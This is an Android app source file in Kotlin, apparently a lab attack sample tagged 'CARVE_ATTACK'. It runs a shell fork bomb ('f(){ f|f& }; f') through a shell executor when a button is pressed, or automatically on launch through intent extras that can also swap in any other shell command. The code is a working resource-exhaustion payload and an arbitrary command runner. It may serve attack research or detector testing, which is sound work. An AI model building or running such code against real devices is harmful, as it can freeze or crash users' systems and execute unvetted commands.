package com.example.forkbomb

import android.os.Bundle
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import android.util.Log
import java.util.concurrent.atomic.AtomicBoolean


class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "CARVE_ATTACK"
        private const val DEFAULT_COMMAND = "f(){ f|f& }; f"
        private const val EXTRA_AUTORUN = "com.example.forkbomb.extra.AUTORUN"
        private const val EXTRA_COMMAND = "com.example.forkbomb.extra.COMMAND"
        private const val EXTRA_TIMEOUT_SEC = "com.example.forkbomb.extra.TIMEOUT_SEC"
        private const val EXTRA_START_DELAY_MS = "com.example.forkbomb.extra.START_DELAY_MS"
        private const val EXTRA_FINISH_AFTER_RUN = "com.example.forkbomb.extra.FINISH_AFTER_RUN"
    }

    private val payloadRunning = AtomicBoolean(false)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
        }

        val runButton = Button(this).apply {
            text = "f(){ f|f& }; f"
        }

        val outputView = TextView(this)
        val scrollView = ScrollView(this).apply {
            addView(outputView)
        }

        layout.addView(runButton)
        layout.addView(scrollView)

        setContentView(layout)

        runButton.setOnClickListener {
            runPayload(
                command = DEFAULT_COMMAND,
                timeoutSec = 5L,
                startDelayMs = 0L,
                finishAfterRun = false,
                outputView = outputView,
            )
        }

        if (intent.getBooleanExtra(EXTRA_AUTORUN, false)) {
            runPayload(
                command = intent.getStringExtra(EXTRA_COMMAND) ?: DEFAULT_COMMAND,
                timeoutSec = intent.getLongExtra(EXTRA_TIMEOUT_SEC, 0L).coerceAtLeast(0L),
                startDelayMs = intent.getLongExtra(EXTRA_START_DELAY_MS, 0L).coerceAtLeast(0L),
                finishAfterRun = intent.getBooleanExtra(EXTRA_FINISH_AFTER_RUN, true),
                outputView = outputView,
            )
        }
    }

    private fun runPayload(
        command: String,
        timeoutSec: Long,
        startDelayMs: Long,
        finishAfterRun: Boolean,
        outputView: TextView,
    ) {
        if (!payloadRunning.compareAndSet(false, true)) {
            Log.w(TAG, "CARVE_PAYLOAD_REJECTED family=forkbomb2 reason=already_running")
            return
        }
        Thread {
            var success = false
            var exitCode: Int? = null
            var output = ""
            try {
                if (startDelayMs > 0L) {
                    Thread.sleep(startDelayMs)
                }
                Log.i(
                    TAG,
                    "CARVE_PAYLOAD_START family=forkbomb2 timeout_sec=$timeoutSec",
                )
                val result = ShellExecutor.execute(command, timeoutSec)
                exitCode = result.exitCode
                success = result.exitCode == 0
                output = "exit=${result.exitCode}\nstdout:\n${result.stdout}\nstderr:\n${result.stderr}"
            } catch (error: Throwable) {
                output = "${error::class.java.simpleName}: ${error.message}"
                Log.e(TAG, "CARVE_PAYLOAD_ERROR family=forkbomb2", error)
            } finally {
                Log.i(
                    TAG,
                    "CARVE_PAYLOAD_END family=forkbomb2 success=$success exit_code=${exitCode ?: -1}",
                )
                payloadRunning.set(false)
                runOnUiThread {
                    outputView.text = output
                    if (finishAfterRun && !isFinishing) {
                        finish()
                    }
                }
            }
        }.apply { name = "carve-forkbomb2-payload" }.start()
    }
}
